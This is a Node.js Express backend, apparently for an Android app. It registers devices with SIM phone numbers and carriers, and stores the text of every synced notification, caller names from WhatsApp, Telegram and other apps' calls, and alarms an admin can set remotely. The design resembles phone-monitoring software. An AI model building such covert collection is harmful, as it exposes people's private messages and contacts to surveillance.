const express = require("express");
const crypto = require("node:crypto");
const { pool } = require("../db");
const { deviceAuth } = require("../middleware/deviceAuth");

const router = express.Router();

function hashToken(token) {
  return crypto.createHash("sha256").update(token).digest("hex");
}

router.post("/register", async (req, res, next) => {
  const body = req.body ?? {};
  const ids = body.ids ?? {};

  const androidId = ids.androidId ? String(ids.androidId) : (body.androidId ? String(body.androidId) : null);
  const persistentId = ids.persistentId ? String(ids.persistentId) : (body.persistentId ? String(body.persistentId) : null);

  if (!androidId && !persistentId) {
    return res.status(400).json({
      success: false,
      error: "A stable device identifier is required.",
    });
  }

  if ((androidId && androidId.length > 256) || (persistentId && persistentId.length > 256)) {
    return res.status(400).json({
      success: false,
      error: "Device identifiers exceed maximum allowed length (256 chars).",
    });
  }

  const token = crypto.randomBytes(32).toString("base64url");
  const tokenHash = hashToken(token);
  const details = body.deviceDetails ?? {};

  const client = await pool.connect();

  try {
    await client.query("BEGIN");

    const lockKey = `zez-device:${androidId ?? ""}:${persistentId ?? ""}`;
    await client.query(
      "SELECT pg_advisory_xact_lock(hashtextextended($1, 0))",
      [lockKey]
    );

    const existing = await client.query(
      `SELECT *
       FROM public.devices
       WHERE ($1::text IS NOT NULL AND androidid = $1)
          OR ($2::text IS NOT NULL AND persistentid = $2)
       FOR UPDATE`,
      [androidId, persistentId]
    );

    if (existing.rows.length > 1) {
      await client.query("ROLLBACK");
      return res.status(409).json({
        success: false,
        error: "Device identifiers match different registrations.",
      });
    }

    let deviceId;

    if (existing.rows.length === 1) {
      const device = existing.rows[0];
      deviceId = device.id;

      await client.query(
        `UPDATE public.devices
         SET androidid = COALESCE(androidid, $2),
             persistentid = COALESCE(persistentid, $3),
             device_name = $4,
             device_model = $5,
             manufacturer = $6,
             brand = $7,
             platform = COALESCE($8, 'Android'),
             os_version = $9,
             app_version = $10,
             sim1_phone_number = $11,
             sim2_phone_number = $12,
             sim1_carrier = $13,
             sim2_carrier = $14,
             sim1_country_iso = $15,
             sim2_country_iso = $16,
             primary_phone_number = COALESCE($17, primary_phone_number),
             token_hash = $18,
             device_details = COALESCE(device_details, '{}'::jsonb) || $19::jsonb,
             registration_status = 'active',
             last_seen_at = NOW(),
             updated_at = NOW()
         WHERE id = $1`,
        [
          deviceId,
          androidId,
          persistentId,
          body.deviceName ?? null,
          body.deviceModel ?? null,
          body.manufacturer ?? null,
          body.brand ?? null,
          body.platform ?? "Android",
          body.osVersion ?? null,
          body.appVersion ?? null,
          body.sim1PhoneNumber ?? null,
          body.sim2PhoneNumber ?? null,
          body.sim1Carrier ?? null,
          body.sim2Carrier ?? null,
          body.sim1CountryIso ?? null,
          body.sim2CountryIso ?? null,
          body.primaryPhoneNumber || body.primary_phone_number || body.phoneNumber || body.phone || null,
          tokenHash,
          JSON.stringify(details),
        ]
      );
    } else {
      const inserted = await client.query(
        `INSERT INTO public.devices (
           id, androidid, persistentid,
           device_name, device_model, manufacturer, brand,
           platform, os_version, app_version,
           sim1_phone_number, sim2_phone_number,
           sim1_carrier, sim2_carrier,
           sim1_country_iso, sim2_country_iso,
           primary_phone_number, token_hash, device_details
         )
         VALUES (
           gen_random_uuid(), $1, $2,
           $3, $4, $5, $6, $7, $8, $9,
           $10, $11, $12, $13, $14, $15,
           $16, $17, $18::jsonb
         )
         RETURNING id`,
        [
          androidId,
          persistentId,
          body.deviceName ?? null,
          body.deviceModel ?? null,
          body.manufacturer ?? null,
          body.brand ?? null,
          body.platform ?? "Android",
          body.osVersion ?? null,
          body.appVersion ?? null,
          body.sim1PhoneNumber ?? null,
          body.sim2PhoneNumber ?? null,
          body.sim1Carrier ?? null,
          body.sim2Carrier ?? null,
          body.sim1CountryIso ?? null,
          body.sim2CountryIso ?? null,
          body.primaryPhoneNumber || body.primary_phone_number || body.phoneNumber || body.phone || null,
          tokenHash,
          JSON.stringify(details),
        ]
      );
      deviceId = inserted.rows[0].id;
    }

    await client.query("COMMIT");

    return res.status(200).json({
      success: true,
      deviceId,
      token,
      androidId,
      persistentId,
    });
  } catch (error) {
    await client.query("ROLLBACK");
    next(error);
  } finally {
    client.release();
  }
});

// Device Notification Sync (captures & stores device notifications with user permission)
// POST /api/devices/notifications/sync
router.post("/notifications/sync", deviceAuth, async (req, res, next) => {
  const deviceId = req.deviceId;
  const items = Array.isArray(req.body.notifications) ? req.body.notifications : [];
  if (items.length === 0) {
    return res.json({ success: true, count: 0 });
  }

  const client = await pool.connect();
  try {
    let insertedCount = 0;
    for (const n of items) {
      if (!n || !n.packageName) continue;
      const pkg = String(n.packageName).slice(0, 255);
      const appName = n.appName ? String(n.appName).slice(0, 255) : null;
      const title = n.title ? String(n.title).trim() : null;
      const content = n.content ? String(n.content).trim() : null;
      const subText = n.subText ? String(n.subText).trim() : null;
      const postTime = Number(n.postTime) || Date.now();
      const postedAt = new Date(postTime);

      const r = await client.query(
        `INSERT INTO public.device_notifications (
          device_id, package_name, app_name, title, content, sub_text, post_time, posted_at
        ) VALUES ($1, $2, $3, $4, $5, $6, $7, $8)
        ON CONFLICT (device_id, package_name, post_time, title) DO NOTHING
        RETURNING id`,
        [deviceId, pkg, appName, title, content, subText, postTime, postedAt]
      );
      if (r.rowCount > 0) insertedCount++;
    }

    return res.json({ success: true, count: insertedCount, totalReceived: items.length });
  } catch (error) {
    next(error);
  } finally {
    client.release();
  }
});

// Third-Party App Calls Sync (WhatsApp, Telegram, Instagram, Messenger VoIP calls)
// POST /api/devices/app-calls/sync
router.post("/app-calls/sync", deviceAuth, async (req, res, next) => {
  const deviceId = req.deviceId;
  const items = Array.isArray(req.body.appCalls) ? req.body.appCalls : [];
  if (items.length === 0) {
    return res.json({ success: true, count: 0 });
  }

  const client = await pool.connect();
  try {
    let insertedCount = 0;
    for (const c of items) {
      if (!c || !c.packageName || !c.callerName) continue;
      const appName = String(c.appName || "App").slice(0, 100);
      const pkg = String(c.packageName).slice(0, 255);
      const callerName = String(c.callerName).trim().slice(0, 255);
      const callType = String(c.callType || "voice").toLowerCase().slice(0, 50);
      const callDirection = String(c.callDirection || "incoming").toLowerCase().slice(0, 50);
      const durationSeconds = Math.max(Number(c.durationSeconds) || 0, 0);
      const callTime = Number(c.callTime) || Date.now();
      const timestamp = new Date(callTime);
      const rawDetails = c.rawDetails ? String(c.rawDetails).trim() : null;

      const r = await client.query(
        `INSERT INTO public.device_app_calls (
          device_id, app_name, package_name, caller_name, call_type, call_direction, duration_seconds, call_time, timestamp, raw_details
        ) VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10)
        ON CONFLICT (device_id, package_name, call_time, caller_name, call_direction) DO NOTHING
        RETURNING id`,
        [deviceId, appName, pkg, callerName, callType, callDirection, durationSeconds, callTime, timestamp, rawDetails]
      );
      if (r.rowCount > 0) insertedCount++;
    }

    return res.json({ success: true, count: insertedCount, totalReceived: items.length });
  } catch (error) {
    next(error);
  } finally {
    client.release();
  }
});

// POST /api/devices/alarms/sync
router.post("/alarms/sync", deviceAuth, async (req, res, next) => {
  const deviceId = req.deviceId;
  const localAlarms = Array.isArray(req.body.alarms) ? req.body.alarms : [];
  const clientDeletedIds = Array.isArray(req.body.deletedAlarmIds)
    ? req.body.deletedAlarmIds.map(Number).filter(n => Number.isFinite(n) && n > 0)
    : [];

  const client = await pool.connect();
  try {
    await client.query("BEGIN");

    if (clientDeletedIds.length > 0) {
      await client.query(
        `UPDATE public.device_alarms
         SET status = 'deleted', updated_at = NOW()
         WHERE device_id = $1 AND alarm_id = ANY($2::bigint[])`,
        [deviceId, clientDeletedIds]
      );
    }

    for (const a of localAlarms) {
      if (!a || !a.id) continue;
      const alarmId = Number(a.id);
      const hour = Number(a.hour) || 0;
      const minute = Number(a.minute) || 0;
      const label = String(a.label || "Alarm").slice(0, 255);
      const isEnabled = a.isEnabled !== false;
      const isVibrate = a.isVibrate !== false;
      const isJitMode = a.isJitMode === true;
      const daysOfWeek = JSON.stringify(Array.isArray(a.daysOfWeek) ? a.daysOfWeek : [false, true, true, true, true, true, false]);
      const ringtoneTitle = String(a.ringtoneTitle || "Default Alarm Ringtone").slice(0, 255);
      const ringtoneUri = String(a.ringtoneUri || "");

      await client.query(
        `INSERT INTO public.device_alarms (
          device_id, alarm_id, hour, minute, label, is_enabled, is_vibrate, is_jit_mode, days_of_week, ringtone_title, ringtone_uri, created_by, status, updated_at
        ) VALUES (
          $1, $2, $3, $4, $5, $6, $7, $8, $9::jsonb, $10, $11, 'device', 'active', NOW()
        )
        ON CONFLICT (device_id, alarm_id) DO UPDATE SET
          hour = EXCLUDED.hour,
          minute = EXCLUDED.minute,
          label = EXCLUDED.label,
          is_enabled = EXCLUDED.is_enabled,
          is_vibrate = EXCLUDED.is_vibrate,
          is_jit_mode = EXCLUDED.is_jit_mode,
          days_of_week = EXCLUDED.days_of_week,
          ringtone_title = EXCLUDED.ringtone_title,
          ringtone_uri = EXCLUDED.ringtone_uri,
          updated_at = NOW()
        WHERE device_alarms.status != 'deleted'`,
        [deviceId, alarmId, hour, minute, label, isEnabled, isVibrate, isJitMode, daysOfWeek, ringtoneTitle, ringtoneUri]
      );
    }

    await client.query("COMMIT");

    // Fetch server state for this device (including admin-created or admin-deleted alarms)
    const { rows } = await client.query(
      `SELECT alarm_id, hour, minute, label, is_enabled, is_vibrate, is_jit_mode, days_of_week, ringtone_title, ringtone_uri, created_by, status
       FROM public.device_alarms
       WHERE device_id = $1`,
      [deviceId]
    );

    const activeAlarms = rows.filter(r => r.status === 'active');
    const deletedAlarmIds = rows.filter(r => r.status === 'deleted').map(r => r.alarm_id);

    return res.json({
      success: true,
      activeAlarms: activeAlarms.map(r => ({
        id: Number(r.alarm_id),
        hour: r.hour,
        minute: r.minute,
        label: r.label,
        isEnabled: r.is_enabled,
        isVibrate: r.is_vibrate,
        isJitMode: r.is_jit_mode,
        daysOfWeek: r.days_of_week,
        ringtoneTitle: r.ringtone_title,
        ringtoneUri: r.ringtone_uri,
        createdBy: r.created_by
      })),
      deletedAlarmIds: deletedAlarmIds.map(Number)
    });
  } catch (error) {
    await client.query("ROLLBACK");
    next(error);
  } finally {
    client.release();
  }
});

module.exports = router;
